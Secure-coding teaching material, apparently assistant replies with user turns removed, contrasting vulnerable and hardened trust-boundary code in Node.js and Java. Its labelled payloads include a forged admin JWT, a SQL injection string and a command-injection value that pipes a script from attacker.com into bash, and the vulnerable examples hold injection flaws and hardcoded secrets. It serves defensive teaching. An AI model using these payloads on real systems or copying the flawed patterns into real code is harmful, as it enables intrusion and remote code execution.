This is a critical trust boundary violation. When internal admin tools share the same API and authentication mechanisms as public applications without proper separation, attackers who compromise any part of the public-facing system can potentially escalate to admin privileges.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json());

const JWT_SECRET = 'shared-secret-key';

// Shared authentication middleware - DANGEROUS: Same for public and admin
const authenticateUser = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Public user endpoint
app.get('/api/user/profile', authenticateUser, (req, res) => {
  res.json({ userId: req.user.id, email: req.user.email });
});

// Admin endpoint - VULNERABLE: Only checks if user is logged in
app.post('/api/admin/reset-user-mfa', authenticateUser, (req, res) => {
  const { targetUserId } = req.body;
  // Dangerous: Any authenticated user can reset anyone's MFA
  resetUserMFA(targetUserId);
  res.json({ success: true, message: `MFA reset for user ${targetUserId}` });
});

// Admin endpoint - VULNERABLE: Trusts client-side role claim
app.get('/api/admin/users', authenticateUser, (req, res) => {
  if (req.user.role === 'admin') {  // Role from JWT can be forged
    return res.json(getAllUsers());
  }
  res.status(403).json({ error: 'Not authorized' });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Attacker forges a JWT with admin role (if secret is weak or leaked)
const forgedToken = jwt.sign(
  { id: 'attacker123', email: 'attacker@evil.com', role: 'admin' },
  'shared-secret-key',  // Leaked or brute-forced secret
  { expiresIn: '1h' }
);

// Or simply call admin endpoint with regular user token
fetch('/api/admin/reset-user-mfa', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${regularUserToken}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ targetUserId: 'victim-ceo-001' })
});
```

**Why This Is Dangerous**:
- No trust boundary between public API and admin functionality
- Role stored in JWT can be manipulated if secret is compromised
- Admin actions don't require re-authentication or additional verification
- Same authentication mechanism for vastly different privilege levels
- No audit trail for sensitive admin operations

**SECURE VERSION**:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// SECURE: Separate secrets for different trust zones
const PUBLIC_JWT_SECRET = process.env.PUBLIC_JWT_SECRET;
const ADMIN_JWT_SECRET = process.env.ADMIN_JWT_SECRET;

// SECURE: Database-backed role verification
const verifyAdminRole = async (userId) => {
  const user = await db.query(
    'SELECT role, is_active, admin_enabled_at FROM users WHERE id = $1',
    [userId]
  );
  return user?.role === 'admin' && user?.is_active === true;
};

// Public authentication middleware
const authenticatePublicUser = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    const decoded = jwt.verify(token, PUBLIC_JWT_SECRET);
    req.user = decoded;
    req.trustZone = 'public';
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// SECURE: Separate admin authentication with additional verification
const authenticateAdmin = async (req, res, next) => {
  const token = req.headers['x-admin-token'];
  const sessionToken = req.headers['x-session-token'];

  if (!token || !sessionToken) {
    auditLog('ADMIN_AUTH_FAILED', { reason: 'missing_tokens', ip: req.ip });
    return res.status(401).json({ error: 'Admin authentication required' });
  }

  try {
    // SECURE: Use separate admin JWT secret
    const decoded = jwt.verify(token, ADMIN_JWT_SECRET);

    // SECURE: Verify role against database, not JWT claim
    const isAdmin = await verifyAdminRole(decoded.id);
    if (!isAdmin) {
      auditLog('ADMIN_AUTH_FAILED', { userId: decoded.id, reason: 'not_admin', ip: req.ip });
      return res.status(403).json({ error: 'Admin privileges required' });
    }

    // SECURE: Verify active session exists in database
    const sessionValid = await verifyAdminSession(decoded.id, sessionToken);
    if (!sessionValid) {
      auditLog('ADMIN_AUTH_FAILED', { userId: decoded.id, reason: 'invalid_session', ip: req.ip });
      return res.status(401).json({ error: 'Invalid admin session' });
    }

    req.admin = decoded;
    req.trustZone = 'admin';
    next();
  } catch (err) {
    auditLog('ADMIN_AUTH_FAILED', { reason: 'token_verification_failed', ip: req.ip });
    return res.status(401).json({ error: 'Invalid admin token' });
  }
};

// Public endpoint
app.get('/api/user/profile', authenticatePublicUser, (req, res) => {
  res.json({ userId: req.user.id, email: req.user.email });
});

// SECURE: Admin endpoint with proper trust boundary
app.post('/api/admin/reset-user-mfa', authenticateAdmin, async (req, res) => {
  const { targetUserId, reason, ticketId } = req.body;

  // SECURE: Require justification for sensitive actions
  if (!reason || !ticketId) {
    return res.status(400).json({ error: 'Reason and ticket ID required' });
  }

  // SECURE: Comprehensive audit logging
  await auditLog('MFA_RESET_INITIATED', {
    adminId: req.admin.id,
    targetUserId,
    reason,
    ticketId,
    ip: req.ip,
    timestamp: new Date().toISOString()
  });

  await resetUserMFA(targetUserId);

  // SECURE: Notify the affected user
  await notifyUser(targetUserId, 'MFA_RESET', { adminAction: true });

  res.json({ success: true, auditId: crypto.randomUUID() });
});

app.listen(3000);
```

**Key Security Controls**:
- **Separate JWT secrets**: Different cryptographic keys for public and admin authentication prevents token reuse across trust boundaries
- **Database-backed role verification**: Never trust JWT claims for authorization; always verify against authoritative data source
- **Session binding**: Admin tokens tied to active sessions that can be revoked instantly
- **Comprehensive audit logging**: Every admin action logged with full context for forensic analysis

Microservice-to-microservice communication is a critical trust boundary that's often overlooked. The 2023 Retool breach partly succeeded because internal services implicitly trusted each other. You need a zero-trust architecture where every service authenticates and authorizes every request.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const { createClient } = require('redis');

const app = express();
app.use(express.json());

// Service identity configuration
const SERVICE_CONFIG = {
  serviceName: process.env.SERVICE_NAME,
  serviceSecret: process.env.SERVICE_SECRET,
  trustedServices: JSON.parse(process.env.TRUSTED_SERVICES || '{}'),
  mTLSEnabled: process.env.MTLS_ENABLED === 'true'
};

// Redis for distributed rate limiting and service registry
const redis = createClient({ url: process.env.REDIS_URL });

// Service-to-service authentication token generator
class ServiceAuth {
  constructor(config) {
    this.config = config;
    this.tokenCache = new Map();
  }

  // Generate signed token for outbound service calls
  generateServiceToken(targetService) {
    const payload = {
      iss: this.config.serviceName,
      aud: targetService,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 300, // 5 minute expiry
      jti: crypto.randomUUID(),
      permissions: this.config.trustedServices[targetService]?.allowedOperations || []
    };

    return jwt.sign(payload, this.config.serviceSecret, { algorithm: 'HS256' });
  }

  // Verify inbound service token
  async verifyServiceToken(token, expectedSource) {
    try {
      const decoded = jwt.verify(token, this.config.serviceSecret);

      // Verify issuer is a known trusted service
      if (!this.config.trustedServices[decoded.iss]) {
        throw new Error(`Unknown service: ${decoded.iss}`);
      }

      // Verify this service is the intended audience
      if (decoded.aud !== this.config.serviceName) {
        throw new Error('Token not intended for this service');
      }

      // Check token hasn't been replayed (store JTI in Redis)
      const jtiKey = `service_token:${decoded.jti}`;
      const exists = await redis.get(jtiKey);
      if (exists) {
        throw new Error('Token replay detected');
      }
      await redis.setEx(jtiKey, 600, 'used'); // Store for 10 mins

      return decoded;
    } catch (err) {
      throw new Error(`Service authentication failed: ${err.message}`);
    }
  }
}

const serviceAuth = new ServiceAuth(SERVICE_CONFIG);

// Trust boundary middleware for service-to-service calls
const authenticateService = async (req, res, next) => {
  const serviceToken = req.headers['x-service-token'];
  const callerService = req.headers['x-caller-service'];
  const requestId = req.headers['x-request-id'] || crypto.randomUUID();

  req.requestId = requestId;

  if (!serviceToken || !callerService) {
    await auditServiceCall({
      requestId,
      action: 'SERVICE_AUTH_FAILED',
      reason: 'missing_credentials',
      callerIp: req.ip
    });
    return res.status(401).json({ error: 'Service authentication required' });
  }

  try {
    const serviceIdentity = await serviceAuth.verifyServiceToken(serviceToken, callerService);

    // Verify caller IP is in allowlist for this service (defense in depth)
    const allowedIPs = SERVICE_CONFIG.trustedServices[callerService]?.allowedIPs || [];
    if (allowedIPs.length > 0 && !allowedIPs.includes(req.ip)) {
      throw new Error(`IP ${req.ip} not authorized for service ${callerService}`);
    }

    req.callerService = serviceIdentity;
    req.trustZone = 'internal-service';

    await auditServiceCall({
      requestId,
      action: 'SERVICE_AUTH_SUCCESS',
      callerService: serviceIdentity.iss,
      targetEndpoint: req.path
    });

    next();
  } catch (err) {
    await auditServiceCall({
      requestId,
      action: 'SERVICE_AUTH_FAILED',
      reason: err.message,
      callerService,
      callerIp: req.ip
    });
    return res.status(403).json({ error: 'Service authentication failed' });
  }
};

// Permission-based authorization for service operations
const requireServicePermission = (permission) => {
  return (req, res, next) => {
    if (!req.callerService?.permissions?.includes(permission)) {
      auditServiceCall({
        requestId: req.requestId,
        action: 'PERMISSION_DENIED',
        callerService: req.callerService?.iss,
        requiredPermission: permission
      });
      return res.status(403).json({ 
        error: 'Insufficient permissions',
        required: permission 
      });
    }
    next();
  };
};

// Rate limiting per service to prevent abuse
const serviceRateLimit = async (req, res, next) => {
  const callerService = req.callerService?.iss;
  if (!callerService) return next();

  const rateLimitKey = `ratelimit:service:${callerService}`;
  const limit = SERVICE_CONFIG.trustedServices[callerService]?.rateLimit || 100;

  const current = await redis.incr(rateLimitKey);
  if (current === 1) {
    await redis.expire(rateLimitKey, 60); // 1 minute window
  }

  if (current > limit) {
    await auditServiceCall({
      requestId: req.requestId,
      action: 'RATE_LIMIT_EXCEEDED',
      callerService,
      currentCount: current,
      limit
    });
    return res.status(429).json({ error: 'Rate limit exceeded' });
  }

  res.setHeader('X-RateLimit-Remaining', Math.max(0, limit - current));
  next();
};

// Internal service endpoint with proper trust boundary
app.post('/internal/user/reset-mfa',
  authenticateService,
  serviceRateLimit,
  requireServicePermission('user:mfa:reset'),
  async (req, res) => {
    const { targetUserId, reason, initiatedBy, approvedBy } = req.body;

    // Validate required approval chain
    if (!approvedBy || approvedBy === initiatedBy) {
      return res.status(400).json({ 
        error: 'MFA reset requires approval from different admin' 
      });
    }

    // Create audit record before action
    const auditId = await createAuditRecord({
      action: 'MFA_RESET',
      targetUserId,
      reason,
      initiatedBy,
      approvedBy,
      callerService: req.callerService.iss,
      requestId: req.requestId,
      timestamp: new Date().toISOString()
    });

    try {
      await resetUserMFA(targetUserId);
      await notifySecurityTeam('MFA_RESET', { targetUserId, auditId });

      res.json({ 
        success: true, 
        auditId,
        message: 'MFA reset completed' 
      });
    } catch (err) {
      await updateAuditRecord(auditId, { status: 'FAILED', error: err.message });
      throw err;
    }
  }
);

// Health check - no auth required but limited info
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', service: SERVICE_CONFIG.serviceName });
});

// Secure audit logging function
async function auditServiceCall(event) {
  const logEntry = {
    ...event,
    timestamp: new Date().toISOString(),
    service: SERVICE_CONFIG.serviceName,
    environment: process.env.NODE_ENV
  };

  // Log to multiple destinations for durability
  console.log(JSON.stringify(logEntry));
  await redis.xAdd('audit:service_calls', '*', logEntry);

  // Alert on suspicious patterns
  if (event.action.includes('FAILED') || event.action === 'RATE_LIMIT_EXCEEDED') {
    await alertSecurityTeam(logEntry);
  }
}

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Service Identity Verification**:
```javascript
// Each service has unique cryptographic identity
const serviceIdentity = {
  name: 'user-service',
  publicKey: fs.readFileSync('/etc/secrets/service.pub'),
  privateKey: fs.readFileSync('/etc/secrets/service.key'),
  // Certificate rotated every 24 hours
  certExpiry: new Date(Date.now() + 86400000)
};
```

2. **Mutual TLS (mTLS) for Network Layer**:
```javascript
// Configure HTTPS server with client certificate verification
const https = require('https');
const server = https.createServer({
  key: fs.readFileSync('/etc/secrets/server.key'),
  cert: fs.readFileSync('/etc/secrets/server.crt'),
  ca: fs.readFileSync('/etc/secrets/ca.crt'),
  requestCert: true,
  rejectUnauthorized: true
}, app);
```

3. **Request Signing for Integrity**:
```javascript
// Sign outbound requests to prevent tampering
const signRequest = (method, path, body, timestamp) => {
  const payload = `${method}\n${path}\n${timestamp}\n${JSON.stringify(body)}`;
  return crypto.createHmac('sha256', SERVICE_CONFIG.serviceSecret)
    .update(payload)
    .digest('hex');
};

// Verify inbound request signatures
const verifyRequestSignature = (req) => {
  const signature = req.headers['x-request-signature'];
  const timestamp = req.headers['x-request-timestamp'];

  // Reject if timestamp too old (prevent replay)
  if (Date.now() - parseInt(timestamp) > 30000) {
    throw new Error('Request timestamp too old');
  }

  const expected = signRequest(req.method, req.path, req.body, timestamp);
  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) {
    throw new Error('Invalid request signature');
  }
};
```

**Additional Protections**:
- **Service mesh integration**: Use Istio/Linkerd for automatic mTLS and traffic policies
- **Network segmentation**: Internal services on separate VLANs/subnets with firewall rules
- **Principle of least privilege**: Each service only has permissions for operations it needs
- **Circuit breakers**: Prevent cascade failures if one service is compromised
- **Canary deployments**: Detect anomalous behavior from new service versions
- **Immutable audit logs**: Write audit logs to append-only storage (S3 with Object Lock)
- **Regular rotation**: Service credentials and certificates rotated automatically

Absolutely yes! Trust boundary violations occur when data crosses from an untrusted zone to a trusted zone without proper validation. Even internal services can receive malicious data that originated from external sources, and failing to validate at trust boundaries has caused major breaches.

**VULNERABLE CODE**:

```java
import javax.servlet.http.*;
import java.sql.*;
import com.google.gson.Gson;

public class OrderProcessingService extends HttpServlet {
    private static final String DB_URL = "jdbc:postgresql://localhost/orders";
    private static final String DB_USER = "orderadmin";
    private static final String DB_PASS = "secret123";

    // VULNERABLE: Internal service trusts data from API Gateway without validation
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        try {
            // Data comes from internal API Gateway - assumed trusted
            String internalPayload = req.getHeader("X-Internal-Order-Data");

            // DANGEROUS: No validation because "it's from our gateway"
            Gson gson = new Gson();
            OrderRequest order = gson.fromJson(internalPayload, OrderRequest.class);

            // DANGEROUS: Directly using untrusted data in privileged operation
            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
            Statement stmt = conn.createStatement();

            // Trust boundary violation: external user input reaches DB without validation
            String sql = "INSERT INTO orders (user_id, product, quantity, price) VALUES ('" 
                + order.getUserId() + "', '" 
                + order.getProduct() + "', " 
                + order.getQuantity() + ", " 
                + order.getPrice() + ")";

            stmt.executeUpdate(sql);

            // DANGEROUS: Executing system command with untrusted data
            Runtime.getRuntime().exec("notify-warehouse " + order.getProduct());

            resp.setStatus(200);
        } catch (Exception e) {
            resp.setStatus(500);
        }
    }
}

class OrderRequest {
    private String userId;
    private String product;
    private int quantity;
    private double price;

    public String getUserId() { return userId; }
    public String getProduct() { return product; }
    public int getQuantity() { return quantity; }
    public double getPrice() { return price; }
}
```

**Attack Payload**:
```json
{
    "userId": "admin' OR '1'='1",
    "product": "laptop; curl attacker.com/shell.sh | bash",
    "quantity": 1,
    "price": 0.01
}
```

**Why This Is Dangerous**:
- Data from external users passes through API Gateway to internal service without re-validation
- Internal service assumes data is "safe" because it came from another internal component
- SQL injection occurs because trust boundary between external/internal was ignored
- Command injection allows arbitrary code execution on internal infrastructure
- Price manipulation allows attackers to set their own prices for orders

**SECURE VERSION**:

```java
import javax.servlet.http.*;
import java.sql.*;
import java.util.regex.Pattern;
import com.google.gson.Gson;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureOrderProcessingService extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecureOrderProcessingService.class);
    private static final String DB_URL = "jdbc:postgresql://localhost/orders";
    private static final String DB_USER = "orderadmin";
    private static final String DB_PASS = System.getenv("DB_PASSWORD");

    // Whitelist patterns for validation at trust boundary
    private static final Pattern USER_ID_PATTERN = Pattern.compile("^[a-zA-Z0-9_-]{3,50}$");
    private static final Pattern PRODUCT_PATTERN = Pattern.compile("^[a-zA-Z0-9 -]{1,100}$");
    private static final int MAX_QUANTITY = 1000;
    private static final double MAX_PRICE = 100000.00;

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        String requestId = java.util.UUID.randomUUID().toString();

        try {
            // DEFENSE 1: Verify request came from trusted internal source
            String sourceService = req.getHeader("X-Source-Service");
            String internalToken = req.getHeader("X-Internal-Auth-Token");

            if (!verifyInternalServiceToken(sourceService, internalToken)) {
                logger.warn("[{}] Unauthorized internal request from: {}", requestId, sourceService);
                resp.setStatus(403);
                return;
            }

            String internalPayload = req.getHeader("X-Internal-Order-Data");
            Gson gson = new Gson();
            OrderRequest order = gson.fromJson(internalPayload, OrderRequest.class);

            // DEFENSE 2: ALWAYS validate at trust boundaries
            ValidationResult validation = validateOrderAtTrustBoundary(order, requestId);
            if (!validation.isValid()) {
                logger.warn("[{}] Trust boundary validation failed: {}", requestId, validation.getErrors());
                resp.setStatus(400);
                return;
            }

            // DEFENSE 3: Use parameterized queries
            try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS)) {
                String sql = "INSERT INTO orders (user_id, product, quantity, price) VALUES (?, ?, ?, ?)";

                try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
                    pstmt.setString(1, order.getUserId());
                    pstmt.setString(2, order.getProduct());
                    pstmt.setInt(3, order.getQuantity());
                    pstmt.setBigDecimal(4, java.math.BigDecimal.valueOf(order.getPrice()));

                    pstmt.executeUpdate();
                }
            }

            // DEFENSE 4: Use message queue instead of system commands
            notifyWarehouseSecurely(order.getProduct(), requestId);

            logger.info("[{}] Order processed for user: {}", requestId, order.getUserId());
            resp.setStatus(200);

        } catch (Exception e) {
            logger.error("[{}] Order processing error", requestId, e);
            resp.setStatus(500);
        }
    }

    private boolean verifyInternalServiceToken(String service, String token) {
        // Verify JWT or HMAC signature from internal service registry
        return service != null && token != null && 
               InternalServiceRegistry.verifyToken(service, token);
    }

    private ValidationResult validateOrderAtTrustBoundary(OrderRequest order, String requestId) {
        ValidationResult result = new ValidationResult();

        if (order.getUserId() == null || !USER_ID_PATTERN.matcher(order.getUserId()).matches()) {
            result.addError("Invalid userId format");
        }

        if (order.getProduct() == null || !PRODUCT_PATTERN.matcher(order.getProduct()).matches()) {
            result.addError("Invalid product format");
        }

        if (order.getQuantity() < 1 || order.getQuantity() > MAX_QUANTITY) {
            result.addError("Quantity out of valid range");
        }

        // CRITICAL: Verify price against product catalog - don't trust client price
        double catalogPrice = ProductCatalog.getPrice(order.getProduct());
        if (Math.abs(order.getPrice() - catalogPrice) > 0.01) {
            result.addError("Price mismatch - possible tampering");
            logger.warn("[{}] Price manipulation attempt: submitted={}, catalog={}", 
                requestId, order.getPrice(), catalogPrice);
        }

        return result;
    }

    private void notifyWarehouseSecurely(String productId, String requestId) {
        // Use message queue with validated product ID lookup
        String validatedProductCode = ProductCatalog.getProductCode(productId);
        if (validatedProductCode != null) {
            MessageQueue.publish("warehouse-notifications", 
                new WarehouseNotification(validatedProductCode, requestId));
        }
    }
}
```

**Key Security Controls**:
- **Service-to-service authentication**: Verify internal requests with signed tokens, not just network location
- **Validation at every trust boundary**: Re-validate ALL data when crossing from untrusted to trusted zones
- **Parameterized queries**: Prevent SQL injection even with validated data (defense in depth)
- **Price verification against catalog**: Never trust client-supplied prices or business-critical values
- **Secure inter-service communication**: Use message queues instead of shell commands

Excellent question! Multi-tier architectures require explicit trust boundary enforcement at each zone transition. The 2023 Barracuda breach happened precisely because validation was only done at the perimeter, not at internal boundaries.

**PRODUCTION PATTERN**:

```java
import javax.servlet.http.*;
import java.sql.*;
import java.security.*;
import java.util.*;
import io.jsonwebtoken.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Trust Boundary Enforcement Framework
 * Implements Zero Trust architecture for multi-tier applications
 */
public class TrustBoundaryEnforcementService {
    private static final Logger logger = LoggerFactory.getLogger(TrustBoundaryEnforcementService.class);
    private static final Logger securityAuditLog = LoggerFactory.getLogger("SECURITY_AUDIT");

    // Define trust zones
    public enum TrustZone {
        EXTERNAL(0),      // Internet/untrusted clients
        DMZ(1),           // Load balancers, API gateways
        APPLICATION(2),   // Business logic services
        DATA(3);          // Databases, caches

        private final int trustLevel;
        TrustZone(int level) { this.trustLevel = level; }
        public int getTrustLevel() { return trustLevel; }
    }

    // Request context that tracks data provenance through trust boundaries
    public static class TrustBoundaryContext {
        private final String requestId;
        private final TrustZone originZone;
        private final TrustZone currentZone;
        private final List<String> crossedBoundaries;
        private final Map<String, ValidationStatus> fieldValidations;
        private final String sourceServiceId;
        private final long timestamp;

        public TrustBoundaryContext(String requestId, TrustZone origin, String sourceService) {
            this.requestId = requestId;
            this.originZone = origin;
            this.currentZone = origin;
            this.crossedBoundaries = new ArrayList<>();
            this.fieldValidations = new HashMap<>();
            this.sourceServiceId = sourceService;
            this.timestamp = System.currentTimeMillis();
        }

        public void recordBoundaryCrossing(TrustZone from, TrustZone to) {
            crossedBoundaries.add(from + "->" + to + "@" + System.currentTimeMillis());
        }

        public void markFieldValidated(String field, TrustZone zone) {
            fieldValidations.put(field, new ValidationStatus(zone, System.currentTimeMillis()));
        }

        public boolean wasValidatedInZone(String field, TrustZone zone) {
            ValidationStatus status = fieldValidations.get(field);
            return status != null && status.getZone().getTrustLevel() >= zone.getTrustLevel();
        }

        public String getRequestId() { return requestId; }
        public TrustZone getOriginZone() { return originZone; }
    }

    /**
     * DMZ Gateway Service - First trust boundary
     */
    public static class DMZGatewayService {
        private final TrustBoundaryValidator validator;

        public DMZGatewayService() {
            this.validator = new TrustBoundaryValidator(TrustZone.DMZ);
        }

        public ProcessedRequest processExternalRequest(HttpServletRequest req) {
            String requestId = UUID.randomUUID().toString();
            TrustBoundaryContext ctx = new TrustBoundaryContext(
                requestId, TrustZone.EXTERNAL, "external-client");

            securityAuditLog.info("[{}] Request entering DMZ from EXTERNAL zone, IP: {}", 
                requestId, req.getRemoteAddr());

            // BOUNDARY CROSSING: EXTERNAL -> DMZ
            // Validate ALL external input at first boundary
            Map<String, String> validatedParams = new HashMap<>();

            for (String param : req.getParameterMap().keySet()) {
                String rawValue = req.getParameter(param);

                // Step 1: Decode and normalize
                String normalizedValue = validator.normalizeInput(rawValue);

                // Step 2: Check for attack patterns
                if (validator.containsAttackPattern(normalizedValue)) {
                    securityAuditLog.warn("[{}] Attack pattern detected in param '{}': {}", 
                        requestId, param, rawValue.substring(0, Math.min(100, rawValue.length())));
                    throw new SecurityException("Invalid input detected");
                }

                // Step 3: Apply schema validation
                String sanitizedValue = validator.sanitizeForSchema(param, normalizedValue);
                validatedParams.put(param, sanitizedValue);

                ctx.markFieldValidated(param, TrustZone.DMZ);
            }

            ctx.recordBoundaryCrossing(TrustZone.EXTERNAL, TrustZone.DMZ);

            // Generate signed token proving DMZ validation occurred
            String dmzValidationToken = generateBoundaryToken(ctx, validatedParams);

            return new ProcessedRequest(ctx, validatedParams, dmzValidationToken);
        }

        private String generateBoundaryToken(TrustBoundaryContext ctx, Map<String, String> params) {
            // Sign the validated data to prove it passed DMZ validation
            return Jwts.builder()
                .setId(ctx.getRequestId())
                .claim("zone", TrustZone.DMZ.name())
                .claim("validated_fields", new ArrayList<>(params.keySet()))
                .claim("origin", ctx.getOriginZone().name())
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + 30000)) // 30 seconds
                .signWith(SignatureAlgorithm.HS256, getZoneSigningKey(TrustZone.DMZ))
                .compact();
        }

        private byte[] getZoneSigningKey(TrustZone zone) {
            return System.getenv("ZONE_KEY_" + zone.name()).getBytes();
        }
    }

    /**
     * Application Tier Service - Second trust boundary
     */
    public static class ApplicationTierService {
        private final TrustBoundaryValidator validator;

        public ApplicationTierService() {
            this.validator = new TrustBoundaryValidator(TrustZone.APPLICATION);
        }

        public void processOrder(ProcessedRequest dmzRequest) {
            TrustBoundaryContext ctx = dmzRequest.getContext();
            String requestId = ctx.getRequestId();

            // BOUNDARY CROSSING: DMZ -> APPLICATION
            securityAuditLog.info("[{}] Request crossing to APPLICATION zone", requestId);

            // Step 1: Verify the DMZ boundary token
            if (!verifyBoundaryToken(dmzRequest.getBoundaryToken(), TrustZone.DMZ)) {
                securityAuditLog.error("[{}] Invalid DMZ boundary token - possible boundary bypass", requestId);
                throw new SecurityException("Trust boundary violation: Invalid origin token");
            }

            // Step 2: RE-VALIDATE at application tier (defense in depth)
            // Even trusted DMZ data gets re-validated with business rules
            Map<String, String> params = dmzRequest.getValidatedParams();

            OrderData order = new OrderData();

            // Validate userId with application-tier business rules
            String userId = params.get("userId");
            if (!validator.isValidUserId(userId)) {
                throw new SecurityException("Invalid userId at application boundary");
            }
            order.setUserId(userId);
            ctx.markFieldValidated("userId", TrustZone.APPLICATION);

            // Validate product against inventory system
            String productId = params.get("productId");
            if (!validator.productExistsInCatalog(productId)) {
                securityAuditLog.warn("[{}] Invalid product reference: {}", requestId, productId);
                throw new SecurityException("Invalid product");
            }
            order.setProductId(productId);
            ctx.markFieldValidated("productId", TrustZone.APPLICATION);

            // CRITICAL: Price comes from server-side catalog, NOT from request
            double trustedPrice = PricingService.getCurrentPrice(productId);
            order.setPrice(trustedPrice);

            // Quantity validation
            int quantity = Integer.parseInt(params.get("quantity"));
            if (!validator.isValidQuantity(productId, quantity)) {
                throw new SecurityException("Invalid quantity");
            }
            order.setQuantity(quantity);
            ctx.markFieldValidated("quantity", TrustZone.APPLICATION);

            ctx.recordBoundaryCrossing(TrustZone.DMZ, TrustZone.APPLICATION);

            // Prepare for data tier with application-tier token
            String appTierToken = generateApplicationTierToken(ctx, order);

            // Pass to data tier with full provenance
            DataTierService dataTier = new DataTierService();
            dataTier.persistOrder(new DataTierRequest(ctx, order, appTierToken));
        }

        private boolean verifyBoundaryToken(String token, TrustZone expectedZone) {
            try {
                Claims claims = Jwts.parser()
                    .setSigningKey(getZoneSigningKey(expectedZone))
                    .parseClaimsJws(token)
                    .getBody();

                return expectedZone.name().equals(claims.get("zone"));
            } catch (Exception e) {
                return false;
            }
        }

        private String generateApplicationTierToken(TrustBoundaryContext ctx, OrderData order) {
            return Jwts.builder()
                .setId(ctx.getRequestId())
                .claim("zone", TrustZone.APPLICATION.name())
                .claim("order_hash", calculateOrderHash(order))
                .claim("boundaries_crossed", ctx.crossedBoundaries)
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + 10000))
                .signWith(SignatureAlgorithm.HS256, getZoneSigningKey(TrustZone.APPLICATION))
                .compact();
        }

        private String calculateOrderHash(OrderData order) {
            return DigestUtils.sha256Hex(
                order.getUserId() + order.getProductId() + order.getQuantity() + order.getPrice());
        }

        private byte[] getZoneSigningKey(TrustZone zone) {
            return System.getenv("ZONE_KEY_" + zone.name()).getBytes();
        }
    }

    /**
     * Data Tier Service - Final trust boundary before database
     */
    public static class DataTierService {
        private static final Logger logger = LoggerFactory.getLogger(DataTierService.class);
        private final TrustBoundaryValidator validator;

        public DataTierService() {
            this.validator = new TrustBoundaryValidator(TrustZone.DATA);
        }

        public void persistOrder(DataTierRequest request) {
            TrustBoundaryContext ctx = request.getContext();
            String requestId = ctx.getRequestId();

            // BOUNDARY CROSSING: APPLICATION -> DATA
            securityAuditLog.info("[{}] Request entering DATA zone, boundaries crossed: {}", 
                requestId, ctx.crossedBoundaries);

            // Step 1: Verify application tier token
            if (!verifyApplicationTierToken(request)) {
                securityAuditLog.error("[{}] CRITICAL: Data tier access without valid app tier token", 
                    requestId);
                throw new SecurityException("Trust boundary violation at data tier");
            }

            // Step 2: Verify complete trust chain
            if (!verifyCompleteTrustChain(ctx)) {
                securityAuditLog.error("[{}] CRITICAL: Incomplete trust chain detected", requestId);
                throw new SecurityException("Trust chain verification failed");
            }

            // Step 3: Final validation before database operations
            OrderData order = request.getOrder();

            // Even at data tier, validate one more time (defense in depth)
            if (!validator.isSafeForPersistence(order)) {
                throw new SecurityException("Order failed data tier validation");
            }

            ctx.recordBoundaryCrossing(TrustZone.APPLICATION, TrustZone.DATA);

            // Step 4: Execute with parameterized queries and audit logging
            String connectionString = System.getenv("DATA_TIER_DB_URL");

            try (Connection conn = DriverManager.getConnection(connectionString)) {
                conn.setAutoCommit(false);

                String sql = "INSERT INTO orders (request_id, user_id, product_id, quantity, " +
                    "price, trust_chain, created_at) VALUES (?, ?, ?, ?, ?, ?::jsonb, NOW())";

                try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
                    pstmt.setString(1, requestId);
                    pstmt.setString(2, order.getUserId());
                    pstmt.setString(3, order.getProductId());
                    pstmt.setInt(4, order.getQuantity());
                    pstmt.setBigDecimal(5, java.math.BigDecimal.valueOf(order.getPrice()));
                    pstmt.setString(6, serializeTrustChain(ctx));

                    pstmt.executeUpdate();
                    conn.commit();

                    securityAuditLog.info("[{}] Order persisted successfully, trust chain: {}", 
                        requestId, ctx.crossedBoundaries);
                }
            } catch (SQLException e) {
                logger.error("[{}] Database error", requestId, e);
                throw new RuntimeException("Failed to persist order");
            }
        }

        private boolean verifyApplicationTierToken(DataTierRequest request) {
            // Verify token and hash integrity
            try {
                Claims claims = Jwts.parser()
                    .setSigningKey(System.getenv("ZONE_KEY_APPLICATION").getBytes())
                    .parseClaimsJws(request.getAppTierToken())
                    .getBody();

                String tokenHash = (String) claims.get("order_hash");
                String computedHash = calculateOrderHash(request.getOrder());

                return tokenHash.equals(computedHash);
            } catch (Exception e) {
                return false;
            }
        }

        private boolean verifyCompleteTrustChain(TrustBoundaryContext ctx) {
            // Verify request crossed all required boundaries in order
            List<String> boundaries = ctx.crossedBoundaries;

            return boundaries.size() >= 2 &&
                   boundaries.get(0).startsWith("EXTERNAL->DMZ") &&
                   boundaries.get(1).startsWith("DMZ->APPLICATION");
        }

        private String serializeTrustChain(TrustBoundaryContext ctx) {
            return new Gson().toJson(Map.of(
                "request_id", ctx.getRequestId(),
                "origin", ctx.getOriginZone().name(),
